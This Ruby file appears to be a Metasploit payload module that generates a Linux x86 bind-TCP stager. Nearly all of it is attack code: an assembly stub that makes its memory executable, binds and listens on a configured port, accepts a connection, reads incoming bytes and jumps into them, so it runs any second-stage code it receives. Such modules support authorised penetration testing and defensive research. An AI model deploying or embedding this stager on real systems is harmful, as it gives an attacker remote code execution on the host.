# -*- coding: binary -*-

require 'msf/core'

module Msf


###
#
# Complex bindtcp payload generation for Linux ARCH_X86
#
###


module Payload::Linux::BindTcp

  include Msf::Payload::Linux

  #
  # Generate the first stage
  #
  def generate

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_bind_tcp({
        :port => datastore['LPORT']
      })
    end

    conf = {
      :port     => datastore['LPORT'],
      :reliable => true
    }

    generate_bind_tcp(conf)
  end

  #
  # Generate and compile the stager
  #
  def generate_bind_tcp(opts={})
    asm = asm_bind_tcp(opts)
    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
  end

  def generate_transport_config(opts={})
    {
      :scheme       => 'tcp',
      :lport        => datastore['LPORT'].to_i,
      :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
      :retry_total  => datastore['SessionRetryTotal'].to_i,
      :retry_wait   => datastore['SessionRetryWait'].to_i
    }
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    # TODO: figure out what this should be
    space = 300

    # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
    space += 14

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Fixnum] :port The port to connect to
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_bind_tcp(opts={})

    #reliable     = opts[:reliable]
    encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first

    asm = %Q^
      bind_tcp:
        push 0x7d                     ; mprotect syscall
        pop eax
        cdq
        mov dl,0x7
        mov ecx,0x1000
        mov ebx,esp
        and bx,0xf000
        int 0x80                      ; invoke mprotect
        xor ebx,ebx
        mul ebx
        push ebx                      ; PROTO
        inc ebx                       ; SYS_SOCKET and SOCK_STREAM
        push ebx
        push 0x2                      ; SYS_BIND and AF_INET
        mov ecx,esp
        mov al,0x66                   ; socketcall syscall
        int 0x80                      ; invoke socketcall (SYS_SOCKET)

        ; TODO: verify that this is wanted (I think it should be),
        ; TODO: and look to optimise this a little.
        ; set the SO_REUSEADDR flag on the socket
        push ecx
        push 4
        push esp
        push 2
        push 1
        push eax
        xchg eax,edi                  ; stash the socket handle
        mov ecx, esp
        push 0xe                      ; SYS_SETSOCKOPT
        pop ebx
        push 0x66                     ; socketcall syscall
        pop eax
        int 0x80
        xchg eax,edi                  ; restore the socket handle
        add esp, 0x14
        pop ecx

        pop ebx
        pop esi
        push edx
        push #{encoded_port}
        push 0x10
        push ecx
        push eax
        mov ecx,esp
        push 0x66                     ; socketcall syscall
        pop eax
        int 0x80                      ; invoke socketcall (SYS_BIND)
        shl ebx,1                     ; SYS_LISTEN
        mov al,0x66                   ; socketcall syscall (SYS_LISTEN)
        int 0x80                      ; invoke socketcall

        push eax                      ; stash the listen socket
        inc ebx                       ; SYS_ACCEPT
        mov al,0x66                   ; socketcall syscall
        mov [ecx+0x4],edx
        int 0x80                      ; invoke socketcall (SYS_ACCEPT)
        xchg eax,ebx
        mov dh,0xc                    ; at least 0x0c00 bytes
        mov al,0x3                    ; read syscall
        int 0x80                      ; invoke read
        xchg ebx,edi                  ; stash the accept socket in edi
        pop ebx                       ; restore the listen socket
        mov al,0x6                    ; close syscall
        int 0x80                      ; invoke close
        jmp ecx                       ; jump to the payload
    ^

    asm
  end

end

end


